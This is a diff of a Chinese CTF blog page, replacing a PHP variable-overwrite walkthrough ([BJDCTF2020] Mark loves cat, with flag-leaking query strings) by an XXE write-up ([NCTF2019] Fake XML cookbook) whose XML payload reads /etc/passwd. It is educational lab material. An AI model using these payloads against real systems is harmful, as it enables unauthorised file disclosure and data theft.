@@ -16,25 +16,27 @@
   <meta name="author" content="YY">
   <meta name="keywords" content="">
   
-    <meta name="description" content="[BJDCTF2020]Mark loves cat进入是一个个人介绍的页面，  所有的连接都是没用的，尝试目录爆破，扫出了.git，下载源码， 1234567891011121314151617181920212223242526272829303132333435&lt;?phpinclude &amp;#x27;flag.php&amp;#x27;;$yds &#x3D; &quot;dog&quot;;$is &#x3D;">
+    <meta name="description" content="[NCTF2019]Fake XML cookbook进入是一个登录页面，  查看源代码发现一段代码， 12345678910111213141516171819202122232425262728293031323334&lt;script type&#x3D;&amp;#x27;text&#x2F;javascript&amp;#x27;&gt; function doLogin()&amp;#123;	var username &#x3D; $">
 <meta property="og:type" content="article">
-<meta property="og:title" content="[ctf-web] BJDCTF2020-MarkLovesCat">
-<meta property="og:url" content="https://s1n9l3.github.io/2022/12/31/[ctf-web]%20BJDCTF2020-MarkLovesCat/index.html">
+<meta property="og:title" content="[ctf-web] NCTF2019-FakeXMLCookbook">
+<meta property="og:url" content="https://s1n9l3.github.io/2023/01/02/[ctf-web]%20NCTF2019-FakeXMLCookbook/index.html">
 <meta property="og:site_name" content="S1n9l3">
-<meta property="og:description" content="[BJDCTF2020]Mark loves cat进入是一个个人介绍的页面，  所有的连接都是没用的，尝试目录爆破，扫出了.git，下载源码， 1234567891011121314151617181920212223242526272829303132333435&lt;?phpinclude &amp;#x27;flag.php&amp;#x27;;$yds &#x3D; &quot;dog&quot;;$is &#x3D;">
+<meta property="og:description" content="[NCTF2019]Fake XML cookbook进入是一个登录页面，  查看源代码发现一段代码， 12345678910111213141516171819202122232425262728293031323334&lt;script type&#x3D;&amp;#x27;text&#x2F;javascript&amp;#x27;&gt; function doLogin()&amp;#123;	var username &#x3D; $">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221231220245616.png">
-<meta property="article:published_time" content="2022-12-31T14:01:44.991Z">
-<meta property="article:modified_time" content="2022-12-31T14:35:21.452Z">
+<meta property="og:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230102165706433.png">
+<meta property="og:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230102165845708.png">
+<meta property="article:published_time" content="2023-01-02T08:55:52.876Z">
+<meta property="article:modified_time" content="2023-01-02T08:59:13.706Z">
 <meta property="article:author" content="YY">
 <meta property="article:tag" content="ctf">
 <meta property="article:tag" content="ctf-web">
+<meta property="article:tag" content="xxe">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221231220245616.png">
+<meta name="twitter:image" content="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230102165706433.png">
   
   
   
-  <title>[ctf-web] BJDCTF2020-MarkLovesCat - S1n9l3</title>
+  <title>[ctf-web] NCTF2019-FakeXMLCookbook - S1n9l3</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -199,7 +201,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="[ctf-web] BJDCTF2020-MarkLovesCat"></span>
+            <span id="subtitle" data-typed-text="[ctf-web] NCTF2019-FakeXMLCookbook"></span>
           
         </div>
 
@@ -210,8 +212,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-12-31 22:01" pubdate>
-          2022年12月31日 晚上
+        <time datetime="2023-01-02 16:55" pubdate>
+          2023年1月2日 下午
         </time>
       </span>
     
@@ -233,7 +235,7 @@
         
         
         
-          14 分钟
+          15 分钟
         
       </span>
     
@@ -271,48 +273,26 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">[ctf-web] BJDCTF2020-MarkLovesCat</h1>
+            <h1 style="display: none">[ctf-web] NCTF2019-FakeXMLCookbook</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h1><p>进入是一个个人介绍的页面，</p>
-<p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221231220245616.png" srcset="/img/loading.gif" lazyload alt="image-20221231220245616"></p>
-<p>所有的连接都是没用的，尝试目录爆破，扫出了<code>.git</code>，下载源码，</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-variable">$yds</span> = <span class="hljs-string">&quot;dog&quot;</span>;<br><span class="hljs-variable">$is</span> = <span class="hljs-string">&quot;cat&quot;</span>;<br><span class="hljs-variable">$handsome</span> = <span class="hljs-string">&#x27;yds&#x27;</span>;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;　　　　<br>    <span class="hljs-variable">$$x</span> = <span class="hljs-variable">$y</span>  ;  <span class="hljs-comment">//post 声明至当前文件</span><br>&#125;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;　　　 <br>    <span class="hljs-variable">$$x</span> = <span class="hljs-variable">$$y</span>;  <span class="hljs-comment">//GET型变量重新赋值为当前文件变量中以其值为键名的值</span><br>&#125;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-variable">$x</span> &amp;&amp; <span class="hljs-variable">$x</span> !== <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;　 <span class="hljs-comment">//传入的变量为flag   value不是flag</span><br>        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$handsome</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;  <br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$yds</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>  || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;   <br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$is</span>);<br>&#125;<br><br><br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;the flag is: &quot;</span>.<span class="hljs-variable">$flag</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+                <h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><p>进入是一个登录页面，</p>
+<p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230102165706433.png" srcset="/img/loading.gif" lazyload alt="image-20230102165706433"></p>
+<p>查看源代码发现一段代码，</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;text/javascript&#x27;</span>&gt;</span><span class="language-javascript"> </span><br><span class="language-javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">doLogin</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">	<span class="hljs-keyword">var</span> username = $(<span class="hljs-string">&quot;#username&quot;</span>).<span class="hljs-title function_">val</span>();</span><br><span class="language-javascript">	<span class="hljs-keyword">var</span> password = $(<span class="hljs-string">&quot;#password&quot;</span>).<span class="hljs-title function_">val</span>();</span><br><span class="language-javascript">	<span class="hljs-keyword">if</span>(username == <span class="hljs-string">&quot;&quot;</span> || password == <span class="hljs-string">&quot;&quot;</span>)&#123;</span><br><span class="language-javascript">		<span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;Please enter the username and password!&quot;</span>);</span><br><span class="language-javascript">		<span class="hljs-keyword">return</span>;</span><br><span class="language-javascript">	&#125;</span><br><span class="language-javascript">	</span><br><span class="language-javascript">	<span class="hljs-keyword">var</span> data = <span class="hljs-string">&quot;&lt;user&gt;&lt;username&gt;&quot;</span> + username + <span class="hljs-string">&quot;&lt;/username&gt;&lt;password&gt;&quot;</span> + password + <span class="hljs-string">&quot;&lt;/password&gt;&lt;/user&gt;&quot;</span>; </span><br><span class="language-javascript">    $.<span class="hljs-title function_">ajax</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;POST&quot;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">url</span>: <span class="hljs-string">&quot;doLogin.php&quot;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">contentType</span>: <span class="hljs-string">&quot;application/xml;charset=utf-8&quot;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>: data,</span><br><span class="language-javascript">        <span class="hljs-attr">dataType</span>: <span class="hljs-string">&quot;xml&quot;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">anysc</span>: <span class="hljs-literal">false</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">success</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">result</span>) &#123;</span><br><span class="language-javascript">        	<span class="hljs-keyword">var</span> code = result.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&quot;code&quot;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">childNodes</span>[<span class="hljs-number">0</span>].<span class="hljs-property">nodeValue</span>;</span><br><span class="language-javascript">        	<span class="hljs-keyword">var</span> msg = result.<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">&quot;msg&quot;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">childNodes</span>[<span class="hljs-number">0</span>].<span class="hljs-property">nodeValue</span>;</span><br><span class="language-javascript">        	<span class="hljs-keyword">if</span>(code == <span class="hljs-string">&quot;0&quot;</span>)&#123;</span><br><span class="language-javascript">        		$(<span class="hljs-string">&quot;.msg&quot;</span>).<span class="hljs-title function_">text</span>(msg + <span class="hljs-string">&quot; login fail!&quot;</span>);</span><br><span class="language-javascript">        	&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(code == <span class="hljs-string">&quot;1&quot;</span>)&#123;</span><br><span class="language-javascript">        		$(<span class="hljs-string">&quot;.msg&quot;</span>).<span class="hljs-title function_">text</span>(msg + <span class="hljs-string">&quot; login success!&quot;</span>);</span><br><span class="language-javascript">        	&#125;<span class="hljs-keyword">else</span>&#123;</span><br><span class="language-javascript">        		$(<span class="hljs-string">&quot;.msg&quot;</span>).<span class="hljs-title function_">text</span>(<span class="hljs-string">&quot;error:&quot;</span> + msg);</span><br><span class="language-javascript">        	&#125;</span><br><span class="language-javascript">        &#125;,</span><br><span class="language-javascript">        <span class="hljs-attr">error</span>: <span class="hljs-keyword">function</span> (<span class="hljs-params">XMLHttpRequest,textStatus,errorThrown</span>) &#123;</span><br><span class="language-javascript">            $(<span class="hljs-string">&quot;.msg&quot;</span>).<span class="hljs-title function_">text</span>(errorThrown + <span class="hljs-string">&#x27;:&#x27;</span> + textStatus);</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;); </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p>主要有三个变量，看之后的判断，大概是利用变量覆盖。</p>
-<p>在php中可以这样：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;b&#x27;</span>;<br><span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;bb&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$$a</span>; <br><span class="hljs-comment">// 输出 bb   1.找到 $a,解析结果：b    2.找到$b,解析结果 bb</span><br></code></pre></td></tr></table></figure>
+<p>看到了xml格式，bp抓包，</p>
+<p>发现发送的数据确实是xml格式的，</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p>首先看第一个循环，</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;　　　　<br>    <span class="hljs-variable">$$x</span> = <span class="hljs-variable">$y</span>  ;  <br>&#125;<br></code></pre></td></tr></table></figure>
+<p>尝试xxe，</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE a[<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">admin</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;admin;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>admin<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p>如果输入<code>yds=flag</code>，就可以将变量<code>yds</code>重新赋值了。</p>
-<p>第二个循环，</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;　　　 <br>    <span class="hljs-variable">$</span><span class="hljs-variable">$x</span> = <span class="hljs-variable">$</span><span class="hljs-variable">$y</span>;  <br>&#125;<br></code></pre></td></tr></table></figure>
-
-<p>如果输入<code>?is=yds</code>，那么变量<code>is</code>就会等于<code>yds</code>了；</p>
-<p>第三个循环，</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-variable">$x</span> &amp;&amp; <span class="hljs-variable">$x</span> !== <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;　 <br>        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$handsome</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
-
-<p>如果GET参数<code>flag</code>等于变量某个变量，且变量名不等于<code>flag</code>的话输出变量<code>handsome</code>；</p>
-<p>第四个判断，</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">if</span>(!isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; !isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;  <br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$yds</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
-
-<p>GET和POST不存在<code>flag</code>变量，输出变量<code>yds</code>；</p>
-<p>第五个判断，</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>  || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;   <br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$is</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
-
-<p>POST或GET的flag参数为<code>flag</code>，输出变量<code>is</code>；</p>
-<p>一种解法，</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">yds</span>=flag<br></code></pre></td></tr></table></figure>
-
-<p>在第二个循环中会将变量<code>$yds</code>变成<code>$flag</code>，然后在第四个判断中输出<code>$yds</code>，得到flag；</p>
-<p>另一种解法，</p>
-<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">?is=<span class="hljs-built_in">flag</span>&amp;<span class="hljs-built_in">flag</span>=<span class="hljs-built_in">flag</span><br></code></pre></td></tr></table></figure>
-
-<p>首先在第二个循环中，将<code>$is</code>变成<code>$flag</code>，然后在第五个判断中输出<code>$is</code>，得到flag；</p>
+<p>读取到了文件，</p>
+<p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20230102165845708.png" srcset="/img/loading.gif" lazyload alt="image-20230102165845708"></p>
+<p>读取根目录下的flag。</p>
 
                 
               </div>
@@ -350,6 +330,8 @@
       
         <a href="/tags/ctf-web/">#ctf-web</a>
       
+        <a href="/tags/xxe/">#xxe</a>
+      
     </div>
   
 </div>
@@ -360,8 +342,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>[ctf-web] BJDCTF2020-MarkLovesCat</div>
-      <div>https://s1n9l3.github.io/2022/12/31/[ctf-web] BJDCTF2020-MarkLovesCat/</div>
+      <div>[ctf-web] NCTF2019-FakeXMLCookbook</div>
+      <div>https://s1n9l3.github.io/2023/01/02/[ctf-web] NCTF2019-FakeXMLCookbook/</div>
     </div>
     <div class="license-meta">
       
@@ -373,7 +355,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2022年12月31日</div>
+          <div>2023年1月2日</div>
         </div>
       
       
@@ -405,9 +387,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/01/01/%5Bjava%5D%20servlet%E7%9B%B8%E5%85%B3/" title="[java] servlet相关">
+                      <a href="/2023/01/02/%5Bctf-web%5D%20%E5%AE%89%E6%B4%B5%E6%9D%AF2019-easyweb/" title="[ctf-web] 安洵杯2019-easyweb">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">[java] servlet相关</span>
+                        <span class="hidden-mobile">[ctf-web] 安洵杯2019-easyweb</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -415,8 +397,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/12/29/%5Bjava%5D%20IDEA%E9%83%A8%E7%BD%B2Tomcat/" title="[java] IDEA部署Tomcat">
-                        <span class="hidden-mobile">[java] IDEA部署Tomcat</span>
+                      <a href="/2023/01/01/%5Bjava%5D%20servlet%E7%9B%B8%E5%85%B3/" title="[java] servlet相关">
+                        <span class="hidden-mobile">[java] servlet相关</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
